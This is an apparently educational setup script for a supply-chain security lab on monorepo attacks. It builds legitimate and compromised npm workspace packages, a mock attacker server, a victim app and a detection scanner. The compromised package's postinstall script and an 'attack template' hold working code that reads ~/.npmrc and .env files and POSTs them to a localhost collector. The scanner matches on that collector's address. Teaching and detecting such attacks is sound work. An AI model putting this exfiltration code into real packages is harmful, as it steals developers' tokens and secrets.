#!/bin/bash

# Scenario 12: Workspace/Monorepo Attack - Setup Script
# This script prepares the environment for the workspace/monorepo attack lab

set -e  # Exit on error

echo "================================================"
echo "🔧 Setting up Workspace/Monorepo Attack Scenario"
echo "================================================"
echo ""

# Check if TESTBENCH_MODE is enabled
if [ "$TESTBENCH_MODE" != "enabled" ]; then
    echo "⚠️  WARNING: TESTBENCH_MODE is not enabled"
    echo "Please run: export TESTBENCH_MODE=enabled"
    echo ""
    read -p "Do you want to continue anyway? (y/N): " -n 1 -r
    echo ""
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
fi

# Check prerequisites
echo "📋 Checking prerequisites..."
echo ""

command -v node >/dev/null 2>&1 || { echo "❌ Node.js is not installed. Please install Node.js 16+"; exit 1; }
command -v npm >/dev/null 2>&1 || { echo "❌ npm is not installed. Please install npm"; exit 1; }

echo "✅ Node.js version: $(node --version)"
echo "✅ npm version: $(npm --version)"
echo ""

# Create workspace root package.json
echo "📝 Creating workspace root package.json..."
cat > package.json << 'EOF'
{
  "name": "devcorp-workspace",
  "version": "1.0.0",
  "description": "DevCorp monorepo workspace [EDUCATIONAL]",
  "private": true,
  "workspaces": [
    "packages/*"
  ],
  "scripts": {
    "install:all": "npm install",
    "test": "echo \"No tests specified\""
  }
}
EOF
echo "✅ Workspace root package.json created"
echo ""

# Create packages directory
echo "📁 Creating packages directory..."
mkdir -p packages
echo "✅ Packages directory created"
echo ""

# Create legitimate workspace packages
echo "📦 Creating legitimate workspace packages..."

# Legitimate utils package
mkdir -p legitimate-packages/utils
cat > legitimate-packages/utils/package.json << 'EOF'
{
  "name": "@devcorp/utils",
  "version": "1.0.0",
  "description": "Utility functions for DevCorp [LEGITIMATE]",
  "main": "index.js",
  "author": "DevCorp",
  "license": "MIT"
}
EOF

cat > legitimate-packages/utils/index.js << 'EOF'
/**
 * LEGITIMATE UTILS PACKAGE
 * Clean utility functions for DevCorp workspace
 */

class Utils {
  static formatString(str) {
    return str.trim().toLowerCase();
  }

  static validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  static log(message) {
    console.log(`[Utils] ${message}`);
  }
}

module.exports = Utils;
EOF

# Legitimate api package
mkdir -p legitimate-packages/api
cat > legitimate-packages/api/package.json << 'EOF'
{
  "name": "@devcorp/api",
  "version": "1.0.0",
  "description": "API client for DevCorp [LEGITIMATE]",
  "main": "index.js",
  "dependencies": {
    "@devcorp/utils": "workspace:*"
  },
  "author": "DevCorp",
  "license": "MIT"
}
EOF

cat > legitimate-packages/api/index.js << 'EOF'
/**
 * LEGITIMATE API PACKAGE
 * API client that uses @devcorp/utils
 */

const Utils = require('@devcorp/utils');

class ApiClient {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
  }

  async request(endpoint) {
    const url = Utils.formatString(`${this.baseUrl}/${endpoint}`);
    Utils.log(`Making request to: ${url}`);
    return { status: 'success', url };
  }
}

module.exports = ApiClient;
EOF

# Legitimate auth package
mkdir -p legitimate-packages/auth
cat > legitimate-packages/auth/package.json << 'EOF'
{
  "name": "@devcorp/auth",
  "version": "1.0.0",
  "description": "Authentication library for DevCorp [LEGITIMATE]",
  "main": "index.js",
  "dependencies": {
    "@devcorp/utils": "workspace:*"
  },
  "author": "DevCorp",
  "license": "MIT"
}
EOF

cat > legitimate-packages/auth/index.js << 'EOF'
/**
 * LEGITIMATE AUTH PACKAGE
 * Authentication that uses @devcorp/utils
 */

const Utils = require('@devcorp/utils');

class Auth {
  static validateToken(token) {
    if (!token || token.length < 10) {
      return false;
    }
    Utils.log('Token validated');
    return true;
  }

  static generateToken(userId) {
    const token = `token_${userId}_${Date.now()}`;
    Utils.log(`Token generated for user: ${userId}`);
    return token;
  }
}

module.exports = Auth;
EOF

echo "✅ Legitimate workspace packages created"
echo ""

# Create compromised workspace package
echo "📦 Creating compromised workspace package..."

mkdir -p compromised-package/utils
cat > compromised-package/utils/package.json << 'EOF'
{
  "name": "@devcorp/utils",
  "version": "1.0.1",
  "description": "Utility functions for DevCorp [COMPROMISED]",
  "main": "index.js",
  "scripts": {
    "postinstall": "node postinstall.js"
  },
  "author": "DevCorp",
  "license": "MIT"
}
EOF

cat > compromised-package/utils/index.js << 'EOF'
/**
 * COMPROMISED UTILS PACKAGE
 * This package has been compromised and includes malicious code
 * 
 * SAFETY: Only works in TESTBENCH_MODE
 */

class Utils {
  static formatString(str) {
    return str.trim().toLowerCase();
  }

  static validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  static log(message) {
    console.log(`[Utils] ${message}`);
  }
}

module.exports = Utils;
EOF

cat > compromised-package/utils/postinstall.js << 'EOF'
/**
 * MALICIOUS POSTINSTALL SCRIPT
 * This executes automatically when the workspace package is installed
 * 
 * SAFETY: Only works in TESTBENCH_MODE
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const fs = require('fs');
  const path = require('path');
  const os = require('os');

  // Collect system information
  const data = {
    timestamp: new Date().toISOString(),
    package: '@devcorp/utils',
    version: '1.0.1',
    attackType: 'workspace-monorepo',
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    workspaceRoot: path.resolve(__dirname, '../..'),
    env: {
      NODE_ENV: process.env.NODE_ENV,
    },
    files: {}
  };

  // Try to read sensitive files from workspace root
  const workspaceRoot = path.resolve(__dirname, '../..');
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),
    path.join(workspaceRoot, '.env'),
    path.join(workspaceRoot, '.env.local'),
    path.join(workspaceRoot, 'package.json'),
  ];

  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) {
      // Silently fail
    }
  });

  // Exfiltrate data to attacker server (localhost in testbench)
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = http.request(options, () => {
    // Data sent successfully
  });

  req.on('error', () => {
    // Silently fail
  });

  req.write(payload);
  req.end();
}
EOF

echo "✅ Compromised workspace package created"
echo ""

# Create mock server
echo "📝 Creating mock attacker server..."
cat > infrastructure/mock-server.js << 'EOF'
/**
 * Mock Attacker Server
 * Receives and logs exfiltrated data from compromised workspace packages
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000;
const logFile = path.join(__dirname, 'captured-data.json');

// Initialize log file
if (!fs.existsSync(logFile)) {
  fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/collect') {
    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        
        // Log to console
        console.log('\n🎯 CAPTURED DATA FROM WORKSPACE PACKAGE:');
        console.log(`Package: ${data.package}@${data.version}`);
        console.log(`Hostname: ${data.hostname}`);
        console.log(`Username: ${data.username}`);
        console.log(`Platform: ${data.platform}`);
        console.log(`Workspace Root: ${data.workspaceRoot}`);
        console.log(JSON.stringify(data, null, 2));
        console.log('─'.repeat(50));
        
        // Save to file
        const captures = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        captures.captures.push({
          timestamp: new Date().toISOString(),
          attackType: 'workspace-monorepo',
          data: data
        });
        fs.writeFileSync(logFile, JSON.stringify(captures, null, 2));
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Data received' }));
      } catch (e) {
        console.error('Error processing data:', e);
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } else if (req.method === 'GET' && req.url === '/captured-data') {
    // Endpoint to view captured data
    const captures = fs.readFileSync(logFile, 'utf8');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(captures);
  } else if (req.method === 'DELETE' && req.url === '/captured-data') {
    // Endpoint to clear captured data
    fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'success', message: 'Data cleared' }));
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log('🎭 Mock Attacker Server Started');
  console.log('─'.repeat(50));
  console.log(`Listening on http://localhost:${PORT}`);
  console.log('');
  console.log('Endpoints:');
  console.log(`  POST   /collect        - Receive exfiltrated data`);
  console.log(`  GET    /captured-data  - View captured data`);
  console.log(`  DELETE /captured-data  - Clear captured data`);
  console.log('─'.repeat(50));
  console.log('Waiting for data from workspace packages...\n');
});
EOF

chmod +x infrastructure/mock-server.js
echo "✅ Mock server created"
echo ""

# Initialize captured data file
echo "📝 Initializing captured data file..."
echo '{"captures": []}' > infrastructure/captured-data.json
echo "✅ Captured data file initialized"
echo ""

# Create detection tool
echo "🔧 Creating detection tools..."
cat > detection-tools/workspace-scanner.js << 'EOF'
#!/usr/bin/env node

/**
 * Workspace Scanner
 * Scans workspace packages to identify compromised packages
 * and detect potential workspace attacks
 */

const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

class WorkspaceScanner {
  constructor(workspaceRoot) {
    this.workspaceRoot = workspaceRoot;
    this.findings = [];
    this.workspacePackages = {};
  }

  /**
   * Scan the workspace
   */
  async scan() {
    console.log('🔍 Workspace Scanner');
    console.log('='.repeat(60));
    console.log(`Scanning workspace: ${this.workspaceRoot}\n`);

    try {
      await this.loadWorkspaceConfig();
      await this.scanWorkspacePackages();
      await this.checkForSuspiciousPackages();
      this.generateReport();
      
      return this.findings.length > 0;
    } catch (error) {
      console.error('❌ Scan failed:', error.message);
      return false;
    }
  }

  /**
   * Load workspace configuration
   */
  async loadWorkspaceConfig() {
    const packageJsonPath = path.join(this.workspaceRoot, 'package.json');
    
    if (!fs.existsSync(packageJsonPath)) {
      console.error('❌ package.json not found');
      return;
    }

    const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
    
    if (!packageJson.workspaces) {
      console.log('ℹ️  No workspaces configured');
      return;
    }

    console.log('📦 Workspace Configuration:');
    console.log(`  Workspaces: ${packageJson.workspaces.join(', ')}\n`);

    // Find all workspace packages
    const packagesDir = path.join(this.workspaceRoot, 'packages');
    if (fs.existsSync(packagesDir)) {
      const packages = fs.readdirSync(packagesDir);
      packages.forEach(pkg => {
        const pkgPath = path.join(packagesDir, pkg);
        if (fs.statSync(pkgPath).isDirectory()) {
          this.workspacePackages[pkg] = pkgPath;
        }
      });
    }
  }

  /**
   * Scan workspace packages
   */
  async scanWorkspacePackages() {
    console.log('📦 Workspace Packages:\n');
    
    Object.keys(this.workspacePackages).forEach(pkgName => {
      const pkgPath = this.workspacePackages[pkgName];
      const pkgJsonPath = path.join(pkgPath, 'package.json');
      
      if (!fs.existsSync(pkgJsonPath)) {
        return;
      }

      try {
        const pkgJson = JSON.parse(fs.readFileSync(pkgJsonPath, 'utf8'));
        console.log(`  📦 ${pkgJson.name}@${pkgJson.version}`);
        console.log(`     Path: ${pkgPath}`);
        
        if (pkgJson.dependencies) {
          const workspaceDeps = Object.keys(pkgJson.dependencies).filter(
            dep => pkgJson.dependencies[dep].startsWith('workspace:')
          );
          if (workspaceDeps.length > 0) {
            console.log(`     Workspace Dependencies: ${workspaceDeps.join(', ')}`);
          }
        }
        console.log('');
      } catch (e) {
        // Skip malformed packages
      }
    });
  }

  /**
   * Check for suspicious packages
   */
  async checkForSuspiciousPackages() {
    console.log('🔍 Checking for Suspicious Patterns:\n');

    Object.keys(this.workspacePackages).forEach(pkgName => {
      const pkgPath = this.workspacePackages[pkgName];
      const pkgJsonPath = path.join(pkgPath, 'package.json');
      
      if (!fs.existsSync(pkgJsonPath)) return;

      try {
        const pkgJson = JSON.parse(fs.readFileSync(pkgJsonPath, 'utf8'));

        // Check for postinstall scripts
        if (pkgJson.scripts && pkgJson.scripts.postinstall) {
          this.findings.push({
            severity: 'WARNING',
            type: 'POSTINSTALL_SCRIPT',
            package: pkgJson.name,
            version: pkgJson.version,
            message: `Workspace package "${pkgJson.name}" has postinstall script`,
            script: pkgJson.scripts.postinstall
          });
        }

        // Check for suspicious file access
        const postinstallPath = path.join(pkgPath, 'postinstall.js');
        if (fs.existsSync(postinstallPath)) {
          const postinstallContent = fs.readFileSync(postinstallPath, 'utf8');
          if (postinstallContent.includes('localhost:3000') || 
              postinstallContent.includes('/collect')) {
            this.findings.push({
              severity: 'CRITICAL',
              type: 'MALICIOUS_POSTINSTALL',
              package: pkgJson.name,
              version: pkgJson.version,
              message: `Workspace package "${pkgJson.name}" has suspicious postinstall script`,
              details: 'Postinstall script contains network requests'
            });
          }
        }
      } catch (e) {
        // Skip
      }
    });
  }

  /**
   * Generate report
   */
  generateReport() {
    console.log('\n' + '='.repeat(60));
    console.log('📊 Scan Results');
    console.log('='.repeat(60));

    console.log(`Total Workspace Packages: ${Object.keys(this.workspacePackages).length}`);
    console.log(`Findings: ${this.findings.length}`);
    console.log('='.repeat(60));

    if (this.findings.length === 0) {
      console.log('\n✅ No suspicious workspace packages found!');
      return;
    }

    console.log('\n🔍 Findings:\n');
    
    this.findings.forEach(finding => {
      const icon = finding.severity === 'CRITICAL' ? '🚨' :
                   finding.severity === 'WARNING' ? '⚠️' : 'ℹ️';
      
      console.log(`${icon} [${finding.severity}] ${finding.message}`);
      if (finding.script) {
        console.log(`   Script: ${finding.script}`);
      }
      if (finding.details) {
        console.log(`   Details: ${finding.details}`);
      }
      console.log('');
    });

    console.log('='.repeat(60));
    
    if (this.findings.some(f => f.severity === 'CRITICAL')) {
      console.log('\n🚨 CRITICAL issues found! Immediate action required.');
      process.exit(1);
    }
  }
}

// CLI Interface
if (require.main === module) {
  const workspaceRoot = process.argv[2] || process.cwd();
  const scanner = new WorkspaceScanner(workspaceRoot);
  scanner.scan();
}

module.exports = WorkspaceScanner;
EOF

chmod +x detection-tools/workspace-scanner.js
echo "✅ Detection tools created"
echo ""

# Create victim app
echo "📦 Setting up victim application..."
mkdir -p victim-app
cat > victim-app/package.json << 'EOF'
{
  "name": "victim-app",
  "version": "1.0.0",
  "description": "Application that uses workspace packages",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {
    "@devcorp/api": "workspace:*",
    "@devcorp/auth": "workspace:*"
  }
}
EOF

cat > victim-app/index.js << 'EOF'
/**
 * VICTIM APPLICATION
 * 
 * This application uses workspace packages from the DevCorp monorepo
 * - @devcorp/api (depends on @devcorp/utils)
 * - @devcorp/auth (depends on @devcorp/utils)
 * 
 * When the workspace is installed, all packages are installed together
 * If @devcorp/utils is compromised, it affects all packages
 */

console.log('🚀 Starting Victim Application...\n');

const ApiClient = require('@devcorp/api');
const Auth = require('@devcorp/auth');

console.log('📦 Loaded workspace packages');
console.log('⚠️  Note: Both packages depend on @devcorp/utils (workspace dependency)\n');

// Simulate application usage
async function runApplication() {
  console.log('='.repeat(60));
  console.log('Using Workspace Packages');
  console.log('='.repeat(60));
  console.log('');

  // Use API client
  console.log('1. Using API Client:');
  const api = new ApiClient('https://api.example.com');
  const result = await api.request('users');
  console.log(JSON.stringify(result, null, 2));
  console.log('');

  // Use Auth
  console.log('2. Using Auth:');
  const token = Auth.generateToken('user123');
  console.log(`Generated token: ${token}`);
  const isValid = Auth.validateToken(token);
  console.log(`Token valid: ${isValid}`);
  console.log('');

  console.log('='.repeat(60));
  console.log('✅ Application running successfully!');
  console.log('='.repeat(60));
  console.log('');

  console.log('⚠️  IMPORTANT: Check if @devcorp/utils was compromised!');
  console.log('   The workspace packages share dependencies.');
  console.log('   If @devcorp/utils is compromised, all packages are affected.');
  console.log('');
  console.log('   Check captured data:');
  console.log('   curl http://localhost:3000/captured-data');
  console.log('');
}

runApplication().catch(err => {
  console.error('❌ Application error:', err);
});

// ============================================================================
// LEARNING NOTES:
// ============================================================================
// This demonstrates a workspace/monorepo attack:
//
// 1. Victim uses workspace with multiple packages
// 2. All packages depend on @devcorp/utils (workspace dependency)
// 3. Attacker compromises @devcorp/utils and adds malicious postinstall
// 4. When workspace is installed, malicious postinstall executes
// 5. Data is exfiltrated from workspace root
// 6. All packages in workspace are affected
//
// Why this is dangerous:
// - Workspace packages share dependencies
// - One compromised package affects entire workspace
// - Postinstall scripts execute automatically
// - Hard to detect because workspace packages are trusted
// - Modern development uses monorepos extensively
//
// Real-world examples:
// - Monorepo compromises in multiple organizations
// - Internal workspace packages used for attacks
// - Build system attacks through workspace packages
// ============================================================================
EOF

echo "✅ Victim application created"
echo ""

# Create template
echo "📝 Creating template..."
mkdir -p templates
cat > templates/workspace-attack-template.js << 'EOF'
/**
 * EDUCATIONAL EXAMPLE: Workspace/Monorepo Attack Template
 * 
 * This template demonstrates how to create a malicious workspace package
 * for educational purposes only.
 * 
 * ATTACK VECTOR:
 * - Compromise a workspace package in a monorepo
 * - Add malicious postinstall script
 * - When workspace is installed, postinstall executes automatically
 * - Affects all packages in the workspace
 * 
 * SAFETY FEATURES:
 * - Only works when TESTBENCH_MODE=enabled
 * - Only sends data to localhost
 * - Clearly marked as malicious
 * 
 * LEARNING OBJECTIVES:
 * - Understand workspace/monorepo attacks
 * - Learn to audit workspace packages
 * - Practice detection techniques
 * - Implement defense strategies
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ============================================================================
// MALICIOUS CODE SECTION - FOR EDUCATIONAL PURPOSES ONLY
// ============================================================================

/**
 * Post-install script that executes automatically
 * This is the attack vector - runs when workspace package is installed
 */
function maliciousPostInstall() {
  // SAFETY CHECK: Only run in testbench environment
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  console.log('[TESTBENCH] Simulating workspace/monorepo attack...');

  // Collect system information
  const data = {
    timestamp: new Date().toISOString(),
    package: '@devcorp/utils', // Name of compromised workspace package
    version: '1.0.1',
    attackType: 'workspace-monorepo',
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    workspaceRoot: path.resolve(__dirname, '../..'),
    env: {
      NODE_ENV: process.env.NODE_ENV,
    },
    files: {}
  };

  // Try to read sensitive files from workspace root
  const workspaceRoot = path.resolve(__dirname, '../..');
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),
    path.join(workspaceRoot, '.env'),
    path.join(workspaceRoot, '.env.local'),
    path.join(workspaceRoot, 'package.json'),
  ];

  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) {
      // Silently fail
    }
  });

  // Exfiltrate data to attacker server (localhost in testbench)
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = http.request(options, () => {
    // Data sent successfully
  });

  req.on('error', () => {
    // Silently fail
  });

  req.write(payload);
  req.end();
}

// Execute if this is a postinstall script
if (require.main === module) {
  maliciousPostInstall();
}

module.exports = { maliciousPostInstall };

// ============================================================================
// DETECTION HINTS FOR LEARNERS:
// ============================================================================
// Red flags to look for in workspace packages:
// 1. Postinstall scripts in workspace packages
// 2. Unexpected network requests during workspace install
// 3. File system access to workspace root
// 4. Environment variable access
// 5. Suspicious version numbers
// 6. Packages with unusual workspace dependencies
// 7. Packages that access files outside their directory
// ============================================================================
EOF

echo "✅ Template created"
echo ""

echo "================================================"
echo "✅ Setup Complete!"
echo "================================================"
echo ""
echo "🎯 Next Steps:"
echo ""
echo "1. Start the mock attacker server:"
echo "   node infrastructure/mock-server.js &"
echo ""
echo "2. Review the legitimate workspace packages:"
echo "   cat legitimate-packages/utils/index.js"
echo "   cat legitimate-packages/api/index.js"
echo ""
echo "3. Review the compromised workspace package:"
echo "   cat compromised-package/utils/postinstall.js"
echo ""
echo "4. Set up the workspace with legitimate packages:"
echo "   cp -r legitimate-packages/* packages/"
echo "   npm install"
echo ""
echo "5. Replace with compromised package:"
echo "   cp -r compromised-package/utils packages/utils"
echo "   npm install"
echo ""
echo "6. Check captured data:"
echo "   curl http://localhost:3000/captured-data"
echo ""
echo "7. Run detection tools:"
echo "   node detection-tools/workspace-scanner.js ."
echo ""
echo "8. Run victim application:"
echo "   cd victim-app"
echo "   npm install"
echo "   export TESTBENCH_MODE=enabled"
echo "   npm start"
echo ""
echo "📖 Read the full lab instructions:"
echo "   cat README.md"
echo ""
echo "Happy learning! 🔐"
